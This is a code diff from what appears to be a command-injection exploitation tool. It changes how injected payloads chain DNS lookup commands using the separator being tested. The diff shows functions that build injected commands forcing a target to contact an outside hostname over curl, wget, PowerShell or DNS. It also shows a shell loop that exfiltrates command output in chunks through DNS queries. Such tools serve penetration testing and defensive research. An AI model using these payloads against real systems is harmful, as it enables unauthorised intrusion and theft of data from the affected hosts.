@@ -79,7 +79,7 @@ def _python_prog(hostname, from_stdin=False, proof=""):
 """
 Build the command that makes the target contact a hostname, carrying a sum for it to evaluate.
 """
-def reach_command(transport, hostname, proof=""):
+def reach_command(transport, hostname, proof="", separator=OR):
   if transport == "curl":
     return "curl -s " + _url(hostname, proof)
   if transport == "wget":
@@ -88,7 +88,7 @@ def reach_command(transport, hostname, proof=""):
     return _python_prog(hostname, proof=proof)
   if transport == "dns":
     # Resolving the name is enough to prove execution, and needs no HTTP client at all.
-    return dns_lookup_command(hostname)
+    return dns_lookup_command(hostname, separator)
   if transport == "powershell":
     # 'iwr' only exists from PowerShell 3.0, while Net.WebClient goes back to 1.0. The URL keeps
     # the single quotes cmd.exe passes through untouched - a double quoted one arrives stripped of
@@ -101,21 +101,24 @@ def reach_command(transport, hostname, proof=""):
 The command that makes the target resolve a name.
 
 On Windows 'nslookup' is always there. Elsewhere it is part of an optional package, so the ones a
-host is likely to have instead follow it, each tried only if the one before it is missing - the
-first that resolves the name stops the chain, and 'ping' comes last because it waits for a reply
-that a host with no ICMP out will never get.
+host is likely to have instead follow it, and 'ping' comes last because it waits for a reply that a
+host with no ICMP out will never get. They are chained with the separator being tested, so a sink
+that filters some other operator does not defeat the separator that would have worked; where there
+is nothing to chain with, only the likeliest command is sent.
 """
-def dns_lookup_command(hostname):
+def dns_lookup_command(hostname, separator=OR):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return "nslookup " + hostname
-  return ("nslookup " + hostname + OR + "getent hosts " + hostname +
-          OR + "host " + hostname + OR + "ping -c1 " + hostname)
+  commands = ["nslookup " + hostname, "getent hosts " + hostname, "host " + hostname, "ping -c1 " + hostname]
+  if not separator:
+    return commands[0]
+  return separator.join(commands)
 
 """
 Out-of-band decision payload (check if host is vulnerable).
 """
 def decision(separator, transport, hostname, proof="", prologue=""):
-  payload = separator + prologue + reach_command(transport, hostname, proof)
+  payload = separator + prologue + reach_command(transport, hostname, proof, separator)
   if settings.TARGET_OS != settings.OS.WINDOWS:
     payload = checks.append_custom_marker(payload, separator)
   # The payload ends on a hostname, so it is the part a sink's own trailing characters would land in.
@@ -245,7 +248,7 @@ def heuristic_payload(channel, target_os):
   probes = []
   for separator, transport in pairs:
     token, hostname = channel.new_payload()
-    parts.append(separator + reach_command(transport, hostname))
+    parts.append(separator + reach_command(transport, hostname, separator=separator))
     probes.append((token, transport))
   payload = "".join(parts)
   payload = payload + (checks.WINDOWS_TAIL if target_os == settings.OS.WINDOWS else checks.UNIX_TAIL)
@@ -343,7 +346,7 @@ def dns_exfil_command(hostname, cmd, separator=""):
   # the opening, or '$((' would be read as arithmetic instead of a subshell.
   return (settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.SINGLE_WHITESPACE + encoded + settings.CMD_SUB_SUFFIX + separator +
           "t=$(( (${#" + settings.RANDOM_VAR_GENERATOR + "} %2B " + str(DNS_CHUNK - 1) + ") / " + chunk + " ))" + separator + "i=1" + separator + "n=1" + separator +
-          "r(){ " + dns_lookup_command("$1") + separator + "}" + separator +
+          "r(){ " + dns_lookup_command("$1", separator) + separator + "}" + separator +
           "while [ $i -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator + "do " +
           "r $n-$t.$(echo $" + settings.RANDOM_VAR_GENERATOR + "|cut -c$i-$((i%2B" + str(DNS_CHUNK - 1) + ")))." + hostname + separator +
           "i=$((i%2B" + chunk + "))" + separator + "n=$((n%2B1))" + separator + "done")
